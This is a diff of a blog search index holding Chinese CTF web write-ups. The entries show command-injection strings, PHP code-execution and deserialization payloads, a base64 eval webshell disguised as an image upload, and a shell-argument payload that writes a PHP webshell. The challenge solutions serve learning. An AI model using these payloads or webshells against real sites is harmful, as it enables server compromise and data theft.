@@ -1,6 +1,29 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>20210516</title>
+    <url>/posts/436545a/</url>
+    <content><![CDATA[<h2 id="BUUCTF-ACTF2020-新生赛-Exec"><a href="#BUUCTF-ACTF2020-新生赛-Exec" class="headerlink" title="BUUCTF[ACTF2020 新生赛]Exec"></a>BUUCTF[ACTF2020 新生赛]Exec</h2><blockquote>
+<p>something wrong so I must use English</p>
+</blockquote>
+<p>command execustion and some strange sign</p>
+<p>just need to ping 127.0.0.1 and we can see that it is ok to connect and then we need use the pipe sign to ping like this</p>
+<pre><code>127.0.0.1 | cat /flag
+</code></pre>
+<p>| is a sign that just do the thing behind</p>
+<p>|| if the first iswrong then do the second</p>
+<p>&amp; is do both the two don’need right</p>
+<p>&amp;&amp; is A-&gt;B A must right then B will be done</p>
+]]></content>
+      <categories>
+        <category>ctf每日一题</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>20210515</title>
     <url>/posts/9d3f05e0/</url>
     <content><![CDATA[<h2 id="BUUCTF-极客大挑战-2019-Secret-File"><a href="#BUUCTF-极客大挑战-2019-Secret-File" class="headerlink" title="BUUCTF[极客大挑战 2019]Secret File"></a>BUUCTF[极客大挑战 2019]Secret File</h2><blockquote>
@@ -26,29 +49,6 @@
 <pre><code>file=hint.php?/../../../../../ffffllllaaaagggg
 </code></pre>
 <p>一顿绕过之后，hint.php?/被当成目录，向上跳目录</p>
-]]></content>
-      <categories>
-        <category>ctf每日一题</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>20210516</title>
-    <url>/posts/436545a/</url>
-    <content><![CDATA[<h2 id="BUUCTF-ACTF2020-新生赛-Exec"><a href="#BUUCTF-ACTF2020-新生赛-Exec" class="headerlink" title="BUUCTF[ACTF2020 新生赛]Exec"></a>BUUCTF[ACTF2020 新生赛]Exec</h2><blockquote>
-<p>something wrong so I must use English</p>
-</blockquote>
-<p>command execustion and some strange sign</p>
-<p>just need to ping 127.0.0.1 and we can see that it is ok to connect and then we need use the pipe sign to ping like this</p>
-<pre><code>127.0.0.1 | cat /flag
-</code></pre>
-<p>| is a sign that just do the thing behind</p>
-<p>|| if the first iswrong then do the second</p>
-<p>&amp; is do both the two don’need right</p>
-<p>&amp;&amp; is A-&gt;B A must right then B will be done</p>
 ]]></content>
       <categories>
         <category>ctf每日一题</category>
@@ -192,6 +192,49 @@ EXECUTE name;  //执行预定义SQL语句
       </tags>
   </entry>
   <entry>
+    <title>20210522</title>
+    <url>/posts/2876c380/</url>
+    <content><![CDATA[<h2 id="Exec"><a href="#Exec" class="headerlink" title="Exec"></a>Exec</h2><pre><code>127.0.0.1 | find / -name flag #一种查找方法
+</code></pre>
+<h2 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h2><blockquote>
+<p>http协议</p>
+</blockquote>
+<p>改代理</p>
+<pre><code>Referer:https://www.Sycsecret.com
+</code></pre>
+<p>改浏览器</p>
+<pre><code>User-Agent:Syclover
+</code></pre>
+<p>简单XFF</p>
+<pre><code>X-Forwarded-For:127.0.0.1
+</code></pre>
+<h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><blockquote>
+<p>sql注入</p>
+</blockquote>
+<p>扫根目录</p>
+<pre><code>? num=1;var_dump(scandir(chr(47)))
+</code></pre>
+<p>flag文件内容</p>
+<pre><code>? num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))
+</code></pre>
+<p>假如waf不允许num变量传递字母，可以在num前加个空格，这样waf就找不到num这个变量了，因为现在的变量叫“ num”，而不是“num”。但php在解析的时候，会先把空格给去掉，这样我们的代码还能正常运行，还上传了非法字符。</p>
+<p> PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：1.删除空白符  2.将某些字符转换为下划线</p>
+<h2 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h2><blockquote>
+<p>文件上传</p>
+</blockquote>
+<p><a href="https://www.cnblogs.com/wangtanzhi/p/12243206.html">https://www.cnblogs.com/wangtanzhi/p/12243206.html</a></p>
+]]></content>
+      <categories>
+        <category>ctf每日一题</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>web</tag>
+        <tag>sql注入</tag>
+        <tag>文件上传</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>20210524</title>
     <url>/posts/c11566b5/</url>
     <content><![CDATA[<h2 id="flag藏在变量里"><a href="#flag藏在变量里" class="headerlink" title="flag藏在变量里"></a>flag藏在变量里</h2><p>神奇的GLOBALS打印出全部变量<br>    /?args=GLOBALS</p>
@@ -250,46 +293,14 @@ id=0&#39; union select 1,2,3,列名 from 表名#
       </tags>
   </entry>
   <entry>
-    <title>20210522</title>
-    <url>/posts/2876c380/</url>
-    <content><![CDATA[<h2 id="Exec"><a href="#Exec" class="headerlink" title="Exec"></a>Exec</h2><pre><code>127.0.0.1 | find / -name flag #一种查找方法
-</code></pre>
-<h2 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h2><blockquote>
-<p>http协议</p>
-</blockquote>
-<p>改代理</p>
-<pre><code>Referer:https://www.Sycsecret.com
-</code></pre>
-<p>改浏览器</p>
-<pre><code>User-Agent:Syclover
-</code></pre>
-<p>简单XFF</p>
-<pre><code>X-Forwarded-For:127.0.0.1
-</code></pre>
-<h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><blockquote>
-<p>sql注入</p>
-</blockquote>
-<p>扫根目录</p>
-<pre><code>? num=1;var_dump(scandir(chr(47)))
-</code></pre>
-<p>flag文件内容</p>
-<pre><code>? num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))
-</code></pre>
-<p>假如waf不允许num变量传递字母，可以在num前加个空格，这样waf就找不到num这个变量了，因为现在的变量叫“ num”，而不是“num”。但php在解析的时候，会先把空格给去掉，这样我们的代码还能正常运行，还上传了非法字符。</p>
-<p> PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：1.删除空白符  2.将某些字符转换为下划线</p>
-<h2 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h2><blockquote>
-<p>文件上传</p>
-</blockquote>
-<p><a href="https://www.cnblogs.com/wangtanzhi/p/12243206.html">https://www.cnblogs.com/wangtanzhi/p/12243206.html</a></p>
-]]></content>
+    <title>20210601</title>
+    <url>/posts/810f4ee1/</url>
+    <content><![CDATA[<h2 id="最近几天在打比赛，断更"><a href="#最近几天在打比赛，断更" class="headerlink" title="最近几天在打比赛，断更"></a>最近几天在打比赛，断更</h2>]]></content>
       <categories>
         <category>ctf每日一题</category>
       </categories>
       <tags>
         <tag>ctf</tag>
-        <tag>web</tag>
-        <tag>sql注入</tag>
-        <tag>文件上传</tag>
       </tags>
   </entry>
   <entry>
@@ -372,14 +383,27 @@ findFile(path)
       </tags>
   </entry>
   <entry>
-    <title>20210601</title>
-    <url>/posts/810f4ee1/</url>
-    <content><![CDATA[<h2 id="最近几天在打比赛，断更"><a href="#最近几天在打比赛，断更" class="headerlink" title="最近几天在打比赛，断更"></a>最近几天在打比赛，断更</h2>]]></content>
+    <title>20210615</title>
+    <url>/posts/9f79bbb9/</url>
+    <content><![CDATA[<h2 id="蓝帽杯-2021-One-Pointer"><a href="#蓝帽杯-2021-One-Pointer" class="headerlink" title="[蓝帽杯 2021]One Pointer"></a>[蓝帽杯 2021]One Pointer</h2><p>首先下载源码，包含user.php和add_api.php代码审计</p>
+<p>add_api.php</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;user.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>=unserialize(<span class="variable">$_COOKIE</span>[<span class="string">&quot;data&quot;</span>]))&#123;</span><br><span class="line">	<span class="variable">$count</span>[++<span class="variable">$user</span>-&gt;count]=<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$count</span>[]=<span class="number">1</span>)&#123;</span><br><span class="line">		<span class="variable">$user</span>-&gt;count+=<span class="number">1</span>;</span><br><span class="line">		setcookie(<span class="string">&quot;data&quot;</span>,serialize(<span class="variable">$user</span>));</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&quot;backdoor&quot;</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="variable">$user</span>=<span class="keyword">new</span> User;</span><br><span class="line">	<span class="variable">$user</span>-&gt;count=<span class="number">1</span>;</span><br><span class="line">	setcookie(<span class="string">&quot;data&quot;</span>,serialize(<span class="variable">$user</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>可以看出是将cookie的data反序列化后赋值给user,抓包发现cookie有个默认的data</p>
+<p>O:4:”User”:1:{s:5:”count”;i:3;}</p>
+<p>这里利用和校赛类似的数组溢出的漏洞，将count设为9223372036854775806，实现自加1后，再赋值就会失败，进而执行eval($_GET[“backdoor”])，方便后续用蚁剑连</p>
+<p>更改一下cookie,然后用蚁剑连，发现有访问目录限制，用插件发现用不了，然后就不会了。<br>查了查，有两种方法。</p>
+<p>第一种是更改fsockopen为pfsockopen,然后再添加端口9001，然后就可以用插件连了。</p>
+<p>第二种是挺花哨的，利用fpm，反弹shell，要在服务器上监听，但我还没有公网服务器，这个暂时理解了下，没法实践。</p>
+<p>放个链接<a href="https://blog.csdn.net/baidu_39504221/article/details/116720875">https://blog.csdn.net/baidu_39504221/article/details/116720875</a></p>
+]]></content>
       <categories>
         <category>ctf每日一题</category>
       </categories>
       <tags>
         <tag>ctf</tag>
+        <tag>web</tag>
+        <tag>代码审计</tag>
       </tags>
   </entry>
   <entry>
@@ -457,30 +481,6 @@ findFile(path)
       <tags>
         <tag>ctf</tag>
         <tag>web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>20210615</title>
-    <url>/posts/9f79bbb9/</url>
-    <content><![CDATA[<h2 id="蓝帽杯-2021-One-Pointer"><a href="#蓝帽杯-2021-One-Pointer" class="headerlink" title="[蓝帽杯 2021]One Pointer"></a>[蓝帽杯 2021]One Pointer</h2><p>首先下载源码，包含user.php和add_api.php代码审计</p>
-<p>add_api.php</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;user.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>=unserialize(<span class="variable">$_COOKIE</span>[<span class="string">&quot;data&quot;</span>]))&#123;</span><br><span class="line">	<span class="variable">$count</span>[++<span class="variable">$user</span>-&gt;count]=<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$count</span>[]=<span class="number">1</span>)&#123;</span><br><span class="line">		<span class="variable">$user</span>-&gt;count+=<span class="number">1</span>;</span><br><span class="line">		setcookie(<span class="string">&quot;data&quot;</span>,serialize(<span class="variable">$user</span>));</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&quot;backdoor&quot;</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="variable">$user</span>=<span class="keyword">new</span> User;</span><br><span class="line">	<span class="variable">$user</span>-&gt;count=<span class="number">1</span>;</span><br><span class="line">	setcookie(<span class="string">&quot;data&quot;</span>,serialize(<span class="variable">$user</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>可以看出是将cookie的data反序列化后赋值给user,抓包发现cookie有个默认的data</p>
-<p>O:4:”User”:1:{s:5:”count”;i:3;}</p>
-<p>这里利用和校赛类似的数组溢出的漏洞，将count设为9223372036854775806，实现自加1后，再赋值就会失败，进而执行eval($_GET[“backdoor”])，方便后续用蚁剑连</p>
-<p>更改一下cookie,然后用蚁剑连，发现有访问目录限制，用插件发现用不了，然后就不会了。<br>查了查，有两种方法。</p>
-<p>第一种是更改fsockopen为pfsockopen,然后再添加端口9001，然后就可以用插件连了。</p>
-<p>第二种是挺花哨的，利用fpm，反弹shell，要在服务器上监听，但我还没有公网服务器，这个暂时理解了下，没法实践。</p>
-<p>放个链接<a href="https://blog.csdn.net/baidu_39504221/article/details/116720875">https://blog.csdn.net/baidu_39504221/article/details/116720875</a></p>
-]]></content>
-      <categories>
-        <category>ctf每日一题</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>web</tag>
-        <tag>代码审计</tag>
       </tags>
   </entry>
   <entry>
@@ -576,27 +576,6 @@ Submit
       </tags>
   </entry>
   <entry>
-    <title>20210819</title>
-    <url>/posts/9c51da98/</url>
-    <content><![CDATA[<h1 id="XXX二手交易市场"><a href="#XXX二手交易市场" class="headerlink" title="XXX二手交易市场"></a>XXX二手交易市场</h1><p>一个实战题目，网站挺花哨的，没什么提示，最后在头像上传页面有个漏洞，上传一个图片，抓包发现是将图片转成base64传输的，可以将一句话伪装一下，就像这样</p>
-<pre><code>image=data:image/php;base64,PD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7Pz4=
-</code></pre>
-<p>将jpeg换成php,后面的一句话base64encode一下，上传得到返回路径，这时候别乱删，把\给删了，直接蚁剑连接翻目录就行</p>
-<h1 id="点login咋没反应"><a href="#点login咋没反应" class="headerlink" title="点login咋没反应"></a>点login咋没反应</h1><p>F12看到有个admin.css，打开提示try，那就直接try,发现有源码，代码审计，很简单，传入一个cookie，这有个踩坑</p>
-<pre><code> echo urlencode(serialize($KEY));
-</code></pre>
-<p>先urlencode一下不容易出错</p>
-]]></content>
-      <categories>
-        <category>ctf每日一题</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>web</tag>
-        <tag>文件上传</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>对web漏洞常见缩写的解释</title>
     <url>/posts/e15b0610/</url>
     <content><![CDATA[<h1 id="对web漏洞常见缩写的解释"><a href="#对web漏洞常见缩写的解释" class="headerlink" title="对web漏洞常见缩写的解释"></a>对web漏洞常见缩写的解释</h1><h2 id="xss（跨站脚本攻击）"><a href="#xss（跨站脚本攻击）" class="headerlink" title="xss（跨站脚本攻击）"></a>xss（跨站脚本攻击）</h2><p>全称<strong>Cross Site Scripting</strong>，攻击者利用网站漏洞把恶意的脚本代码注入到网页中，当其他用户浏览这些网页时，就会执行其中的恶意代码，对受害用户可能采取 Cookies 资料窃取、会话劫持、钓鱼欺骗等各种攻击。</p>
@@ -628,6 +607,27 @@ Submit
       <tags>
         <tag>ctf</tag>
         <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>20210819</title>
+    <url>/posts/9c51da98/</url>
+    <content><![CDATA[<h1 id="XXX二手交易市场"><a href="#XXX二手交易市场" class="headerlink" title="XXX二手交易市场"></a>XXX二手交易市场</h1><p>一个实战题目，网站挺花哨的，没什么提示，最后在头像上传页面有个漏洞，上传一个图片，抓包发现是将图片转成base64传输的，可以将一句话伪装一下，就像这样</p>
+<pre><code>image=data:image/php;base64,PD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7Pz4=
+</code></pre>
+<p>将jpeg换成php,后面的一句话base64encode一下，上传得到返回路径，这时候别乱删，把\给删了，直接蚁剑连接翻目录就行</p>
+<h1 id="点login咋没反应"><a href="#点login咋没反应" class="headerlink" title="点login咋没反应"></a>点login咋没反应</h1><p>F12看到有个admin.css，打开提示try，那就直接try,发现有源码，代码审计，很简单，传入一个cookie，这有个踩坑</p>
+<pre><code> echo urlencode(serialize($KEY));
+</code></pre>
+<p>先urlencode一下不容易出错</p>
+]]></content>
+      <categories>
+        <category>ctf每日一题</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>web</tag>
+        <tag>文件上传</tag>
       </tags>
   </entry>
   <entry>
@@ -697,29 +697,6 @@ Submit
       </tags>
   </entry>
   <entry>
-    <title>20210901</title>
-    <url>/posts/8a5309dc/</url>
-    <content><![CDATA[<h1 id="mfs"><a href="#mfs" class="headerlink" title="mfs"></a>mfs</h1><blockquote>
-<p>git泄露，代码审计，assert命令执行</p>
-</blockquote>
-<pre><code>pyload: ?page=abc&#39;) or system(&quot;tac templates/flag.php&quot;);//
-</code></pre>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">	<span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="variable">$page</span> = <span class="string">&quot;home&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="string">&quot;templates/&quot;</span> . <span class="variable">$page</span> . <span class="string">&quot;.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// I heard &#x27;..&#x27; is dangerous!</span></span><br><span class="line">assert(<span class="string">&quot;strpos(&#x27;<span class="subst">$file</span>&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Detected hacking attempt!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> Make this look nice</span></span><br><span class="line">assert(<span class="string">&quot;file_exists(&#x27;<span class="subst">$file</span>&#x27;)&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;That file doesn&#x27;t exist!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<pre><code>python2 GitHack.py http://114.67.246.176:10015/.git/
-</code></pre>
-<p>先用githack,爬取.git,发现存在flag.php,利用assert代码执行，先用’)将strops闭合，<br>然后执行后面的</p>
-]]></content>
-      <categories>
-        <category>ctf每日一题</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>web</tag>
-        <tag>rce</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>20210830</title>
     <url>/posts/d7bb00be/</url>
     <content><![CDATA[<h1 id="HMBCTF-2021-EzLight"><a href="#HMBCTF-2021-EzLight" class="headerlink" title="[HMBCTF 2021]EzLight"></a>[HMBCTF 2021]EzLight</h1><p>先下载源码，本地搭建一下环境，我这出了点问题了，一直显示服务器内部错误。</p>
@@ -756,6 +733,29 @@ Submit
         <tag>ctf</tag>
         <tag>web</tag>
         <tag>反序列化</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>20210901</title>
+    <url>/posts/8a5309dc/</url>
+    <content><![CDATA[<h1 id="mfs"><a href="#mfs" class="headerlink" title="mfs"></a>mfs</h1><blockquote>
+<p>git泄露，代码审计，assert命令执行</p>
+</blockquote>
+<pre><code>pyload: ?page=abc&#39;) or system(&quot;tac templates/flag.php&quot;);//
+</code></pre>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">	<span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="variable">$page</span> = <span class="string">&quot;home&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="string">&quot;templates/&quot;</span> . <span class="variable">$page</span> . <span class="string">&quot;.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// I heard &#x27;..&#x27; is dangerous!</span></span><br><span class="line">assert(<span class="string">&quot;strpos(&#x27;<span class="subst">$file</span>&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Detected hacking attempt!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> Make this look nice</span></span><br><span class="line">assert(<span class="string">&quot;file_exists(&#x27;<span class="subst">$file</span>&#x27;)&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;That file doesn&#x27;t exist!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<pre><code>python2 GitHack.py http://114.67.246.176:10015/.git/
+</code></pre>
+<p>先用githack,爬取.git,发现存在flag.php,利用assert代码执行，先用’)将strops闭合，<br>然后执行后面的</p>
+]]></content>
+      <categories>
+        <category>ctf每日一题</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>web</tag>
+        <tag>rce</tag>
       </tags>
   </entry>
   <entry>
@@ -815,26 +815,8 @@ Submit
         <tag>ctf</tag>
         <tag>web</tag>
         <tag>sql注入</tag>
-        <tag>代码审计</tag>
         <tag>文件上传</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>20210907</title>
-    <url>/posts/6330ace9/</url>
-    <content><![CDATA[<h1 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h1><p>利用了namp一个参数，将一句话写入文件，rce</p>
-<p>同时escapeshellarg()和escapeshellcmd()同时出现会有bug</p>
-<pre><code>pyload:?host=&#39; &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php&#39;
-</code></pre>
-<h1 id=""><a href="#" class="headerlink" title=""></a></h1>]]></content>
-      <categories>
-        <category>ctf每日一题</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>web</tag>
-        <tag>rce</tag>
-        <tag>命令执行</tag>
+        <tag>代码审计</tag>
       </tags>
   </entry>
   <entry>
@@ -881,36 +863,21 @@ Submit
       </tags>
   </entry>
   <entry>
-    <title>20210927</title>
-    <url>/posts/5106ce6b/</url>
-    <content><![CDATA[<h2 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h2><blockquote>
-<p>php模板注入</p>
-</blockquote>
-<p>php存在模板注入漏洞，不仅python有，php也有</p>
-<p>该题是通过xff的方式获取的本机ip，在这里测试是否有模板注入，测试49，能执行说明存在，然后cat /flag就行，本来打算反弹个shell玩玩呢，结果一个都不能用。</p>
-<h2 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h2><blockquote>
-<p>反序列化绕过</p>
-</blockquote>
-<p>这题本来也想反弹个shell，也是弹了半天没谈过来。。</p>
-<p>直接cat flag也没有，只能find命令了</p>
-<p>先抓包，怀疑可能有call_user_func，随便试了几个都被过滤了，file_get_contents没被禁，获取index.php源码，代码审计</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$disable_fun</span> = <span class="keyword">array</span>(<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;shell_exec&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;passthru&quot;</span>,<span class="string">&quot;proc_open&quot;</span>,<span class="string">&quot;show_source&quot;</span>,<span class="string">&quot;phpinfo&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;dl&quot;</span>,<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;proc_terminate&quot;</span>,<span class="string">&quot;touch&quot;</span>,<span class="string">&quot;escapeshellcmd&quot;</span>,<span class="string">&quot;escapeshellarg&quot;</span>,<span class="string">&quot;assert&quot;</span>,<span class="string">&quot;substr_replace&quot;</span>,<span class="string">&quot;call_user_func_array&quot;</span>,<span class="string">&quot;call_user_func&quot;</span>,<span class="string">&quot;array_filter&quot;</span>, <span class="string">&quot;array_walk&quot;</span>,  <span class="string">&quot;array_map&quot;</span>,<span class="string">&quot;registregister_shutdown_function&quot;</span>,<span class="string">&quot;register_tick_function&quot;</span>,<span class="string">&quot;filter_var&quot;</span>, <span class="string">&quot;filter_var_array&quot;</span>, <span class="string">&quot;uasort&quot;</span>, <span class="string">&quot;uksort&quot;</span>, <span class="string">&quot;array_reduce&quot;</span>,<span class="string">&quot;array_walk&quot;</span>, <span class="string">&quot;array_walk_recursive&quot;</span>,<span class="string">&quot;pcntl_exec&quot;</span>,<span class="string">&quot;fopen&quot;</span>,<span class="string">&quot;fwrite&quot;</span>,<span class="string">&quot;file_put_contents&quot;</span>); <span class="comment"># 过滤了很多函数，剩了个file_get_contents没被禁</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">gettime</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$p</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$result</span> = call_user_func(<span class="variable">$func</span>, <span class="variable">$p</span>);</span><br><span class="line">        <span class="variable">$a</span>= gettype(<span class="variable">$result</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$a</span> == <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;<span class="keyword">return</span> <span class="string">&quot;&quot;</span>;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;Y-m-d h:i:s a&quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;func != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> gettime(<span class="keyword">$this</span>-&gt;func, <span class="keyword">$this</span>-&gt;p);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># 可以利用反序列化漏洞</span></span><br><span class="line">    <span class="variable">$func</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;func&quot;</span>];</span><br><span class="line">    <span class="variable">$p</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;p&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$func</span> != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="variable">$func</span> = strtolower(<span class="variable">$func</span>);</span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$func</span>,<span class="variable">$disable_fun</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> gettime(<span class="variable">$func</span>, <span class="variable">$p</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Hacker...&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>写出exp</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;find / -name flag*&quot;</span>; <span class="comment"># 第一部</span></span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;cat /tmp/flagoefiu4r93&quot;</span>; <span class="comment"># 第二部</span></span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> Test();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>得到pyload: </p>
-<pre><code>func=file_get_contents&amp;p=O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:22:&quot;cat /tmp/flagoefiu4r93&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;
+    <title>20210907</title>
+    <url>/posts/6330ace9/</url>
